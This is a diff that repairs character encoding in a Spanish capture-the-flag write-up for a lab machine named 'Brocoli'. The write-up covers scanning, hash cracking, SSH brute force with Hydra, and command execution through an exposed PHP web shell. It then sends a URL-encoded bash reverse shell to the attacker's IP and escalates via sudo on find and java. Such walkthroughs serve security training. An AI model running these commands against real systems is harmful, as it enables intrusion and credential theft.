@@ -35,12 +35,12 @@ Herramientas:
  - penelope
 Fecha: 2026-03-10
 ---
-<img width="1024" height="1024" alt="Pasted image 20260310082813" src="https://github.com/user-attachments/assets/a623b2dc-f6a2-47a7-9820-f6ec76a9e05b" />
+![[../../attachments/Pasted image 20260310082813.png]]
 
 Vamos a empezar con un reconocimiento de la red para saber la *IP* de la maquina.
 
 ```bash
-é sudo arp-scan -I eth0 --localnet                                  
+ sudo arp-scan -I eth0 --localnet                                  
 
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
@@ -54,22 +54,22 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 3 responded
 ```
 
-Observamos que la *IP* de la maquina objetivo es la *10.0.11.15* as├¡ que empezaremos con la enumeraci├│n de puertos.
+Observamos que la *IP* de la maquina objetivo es la *10.0.11.15* así que empezaremos con la enumeración de puertos.
 
 ```bash
-settarget 10.0.11.15            
+ settarget 10.0.11.15            
 TARGET establecido: 10.0.11.15
 
-gomap $TARGET
+ gomap $TARGET
 
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
- ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
-  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
+  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
+ ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
+ ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
+ ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+ ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
+  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 
-­ Scanning 10.0.11.15 (996 ports, CONNECT scan)
+🎯 Scanning 10.0.11.15 (996 ports, CONNECT scan)
 
 PORT    STATE 
 22      open  
@@ -78,18 +78,18 @@ PORT    STATE
 Host Exposure Summary
 - 10.0.11.15 | open ports: 2 | critical: ssh | exposure: medium
 
-Ô£ô Completed scan in 59ms | hosts: 1 | open ports: 2
+✓ Completed scan in 59ms | hosts: 1 | open ports: 2
 
-gomap -s -p 22,80 $TARGET
+ gomap -s -p 22,80 $TARGET
 
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
- ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
-  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
+  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
+ ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
+ ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
+ ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+ ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
+  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 
-­ Scanning 10.0.11.15 (2 ports, CONNECT scan)
+🎯 Scanning 10.0.11.15 (2 ports, CONNECT scan)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 9.6p1 Ubuntu-3ubuntu13.13
@@ -98,11 +98,11 @@ PORT    STATE  SERVICE         VERSION
 Host Exposure Summary
 - 10.0.11.15 | open ports: 2 | critical: ssh | exposure: medium
 
-Ô£ô Completed scan in 10ms | hosts: 1 | open ports: 2
+✓ Completed scan in 10ms | hosts: 1 | open ports: 2
 ```
 
 Tenemos 2 puertos abiertos:
-- 22 para conexi├│n por *SSH*
+- 22 para conexión por *SSH*
 - 80 para paginas web por *HTTP*
 
 Veamos que podemos ver en la web.
@@ -112,7 +112,7 @@ Pero solo tenemos la pagina por defecto de *Apache* con los logos de *Ubuntu*.
 Pasemos a enumerar las carpetas a ver que encontramos.
 
 ```bash
-é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
+ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -137,7 +137,7 @@ Finished
 ===============================================================
 ```
 
-Parece que solo tenemos una v├¡a de estudio y es la carpeta **uploads**, veamos que tiene.
+Parece que solo tenemos una vía de estudio y es la carpeta **uploads**, veamos que tiene.
 
 ```http
 Index of /uploads
@@ -150,10 +150,10 @@ Apache/2.4.58 (Ubuntu) Server at 10.0.11.15 Port 80
 
 Parece que tenemos un fichero *PHP* y un *TXT*, veamos que podemos sacar.
 
-En el fichero *TXT* nos encontramos con un texto y parece estar codificado `913026c7754df0fbdc89b75007ad5a66` as├¡ que vamos a ver que nos dice.
+En el fichero *TXT* nos encontramos con un texto y parece estar codificado `913026c7754df0fbdc89b75007ad5a66` así que vamos a ver que nos dice.
 
 ```bash
-é hashcat -m 0 informebrocoli.txt /usr/share/wordlists/rockyou.txt
+ hashcat -m 0 informebrocoli.txt /usr/share/wordlists/rockyou.txt
 hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -217,7 +217,7 @@ Started: Tue Mar 10 09:40:47 2026
 Stopped: Tue Mar 10 09:41:04 2026
 ```
 
-Con este decode obtenemos una contrase├▒a que puede ser para un usuario llamado `brocoli` con una contrase├▒a `informebrocoli`, pero hay algo que me llama la atenci├│n y es el fichero `brocoli.php`.
+Con este decode obtenemos una contraseña que puede ser para un usuario llamado `brocoli` con una contraseña `informebrocoli`, pero hay algo que me llama la atención y es el fichero `brocoli.php`.
 
 ```http
 http://10.0.11.15/uploads/brocoli.php?cmd=cat+/etc/passwd
@@ -269,10 +269,10 @@ Podemos ver usuarios interesantes:
 - brocolon
 - brocoli
 
-Con los usuarios en mano y la contrase├▒a que obtuvimos antes ya podemos intentar acceder por *SSH* a la maquina objetivo.
+Con los usuarios en mano y la contraseña que obtuvimos antes ya podemos intentar acceder por *SSH* a la maquina objetivo.
 
 ```bash
-é ssh brocolon@$TARGET
+ ssh brocolon@$TARGET
 The authenticity of host '10.0.11.15 (10.0.11.15)' can't be established.
 ED25519 key fingerprint is: SHA256:XWxwWSXa6jC3DpvVZr2yRGiHhJbzOik05soJHdORKLQ
 This key is not known by any other names.
@@ -282,45 +282,45 @@ brocolon@10.0.11.15's password:
 Permission denied, please try again.
 brocolon@10.0.11.15's password: 
 
-é ssh brocoli@$TARGET 
+ ssh brocoli@$TARGET 
 brocoli@10.0.11.15's password: 
 Permission denied, please try again.
 brocoli@10.0.11.15's password: 
 
-é ssh root@$TARGET   
+ ssh root@$TARGET   
 root@10.0.11.15's password: 
 Permission denied, please try again.
 root@10.0.11.15's password: 
 ```
 
-Parece que la contrase├▒a `mecmec` no ha servido, puede que sea solo una referencia al *corre caminos* de los dibujos animados.
+Parece que la contraseña `mecmec` no ha servido, puede que sea solo una referencia al *corre caminos* de los dibujos animados.
 
 Por este motivo usaremos **Hydra** contra *SSH*.
 
 ```bash
-é hydra -l brocoli -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
-é hydra -l brocolon -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
-é hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+ hydra -l brocoli -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+ hydra -l brocolon -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 ```
 
-Pero ninguna funciono, as├¡ que usaremos el `Web Shell` para generar una `Revershell` y poder conectar como el usuario *www-data* y desde hay ir pivotando y escalando privilegios.
+Pero ninguna funciono, así que usaremos el `Web Shell` para generar una `Revershell` y poder conectar como el usuario *www-data* y desde hay ir pivotando y escalando privilegios.
 
 ```http
 http://10.0.11.15/uploads/brocoli.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.11.11/443%200%3E%261%27
 ```
 
-Con este comando codificado en formato *URL* obtenemos la conexi├│n contra nuestra maquina.
+Con este comando codificado en formato *URL* obtenemos la conexión contra nuestra maquina.
 
 ```bash
-é penelope -p 443
-[+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.11 ÔÇó 172.17.0.1
-Ô×ñ  ­Åá Main Menu (m) ­ÆÇ Payloads (p) ­ö Clear (Ctrl-L) ­Ü½ Quit (q/Ctrl-C)
-[+] Got reverse shell from TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64 ­ÿì´©Å Assigned SessionID <1>
+ penelope -p 443
+[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64 😍️ Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/python3! ­Æ¬
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/jduran/.penelope/sessions/TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64/2026_03_10-10_16_49-968.log ­ô£
-ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+[+] Logging to /home/jduran/.penelope/sessions/TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64/2026_03_10-10_16_49-968.log 📜
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ ls
 brocoli.php  informebrocoli.txt
 www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ ls /opt/
@@ -331,14 +331,14 @@ www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ cat /opt/credenciales.txt
 Credenciales:
 --------------------------------------------------------------------------
 [+] Usuario: brocoli 
-[+] Contrase├▒a: megustalafruta
+[+] Contraseña: megustalafruta
 --------------------------------------------------------------------------
 
 
 www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$
 ```
 
-Parece que ya tenemos el primer `usuario:contrase├▒a` despues de busacar un poco.
+Parece que ya tenemos el primer `usuario:contraseña` despues de busacar un poco.
 
 Empecemos a indagar y seguir escalando.
 
@@ -356,7 +356,7 @@ User brocoli may run the following commands on TheHackersLabs-Brocoli:
 brocoli@TheHackersLabs-Brocoli:~$
 ```
 
-Parece que tenemos el primer pivotin de usuario y ademas tenemos la opci├│n de hacer una escalada a `brocolon` desde el binario **find**.
+Parece que tenemos el primer pivotin de usuario y ademas tenemos la opción de hacer una escalada a `brocolon` desde el binario **find**.
 
 ```bash
 brocoli@TheHackersLabs-Brocoli:~$ cd /var/www/html/uploads/
@@ -380,7 +380,7 @@ User brocolon may run the following commands on TheHackersLabs-Brocoli:
     (ALL : ALL) NOPASSWD: /usr/bin/java
 ```
 
-Parece que podemos ser `root` a trav├®s de **java** pero implica un paso mas, primero tenemos que crear un fichero `shell.java` pero esto no seria posible sin un compilador de *java*, pero hay algunas versiones de *java* que realizan un compilado temporal.
+Parece que podemos ser `root` a través de **java** pero implica un paso mas, primero tenemos que crear un fichero `shell.java` pero esto no seria posible sin un compilador de *java*, pero hay algunas versiones de *java* que realizan un compilado temporal.
 
 ```bash
 openjdk version "21.0.9" 2025-10-21
@@ -388,9 +388,9 @@ OpenJDK Runtime Environment (build 21.0.9+10-Ubuntu-124.04)
 OpenJDK 64-Bit Server VM (build 21.0.9+10-Ubuntu-124.04, mixed mode, sharing)
 ```
 
-Esta versi├│n nos permite realizar esta acci├│n.
+Esta versión nos permite realizar esta acción.
 
-El c├│digo que usaremos sera el siguiente:
+El código que usaremos sera el siguiente:
 
 ```java
 import java.io.*;
@@ -402,7 +402,7 @@ public class root {
 }
 ```
 
-Crearemos el fichero con este c├│digo mediante `nano`.
+Crearemos el fichero con este código mediante `nano`.
 
 ```bash
 brocolon@TheHackersLabs-Brocoli:~$ nano shell.java
@@ -420,6 +420,4 @@ congrats.txt  root.txt
 
 Con esto ya hemos terminado el laboratorio.
 
-Ha sido interesante llegar a escalar los privilegios a trav├®s de los distintos usuarios y la posibilidad de tener directamente un `Web Shell`, lo cual es una falla de seguridad.
-
-
+Ha sido interesante llegar a escalar los privilegios a través de los distintos usuarios y la posibilidad de tener directamente un `Web Shell`, lo cual es una falla de seguridad.
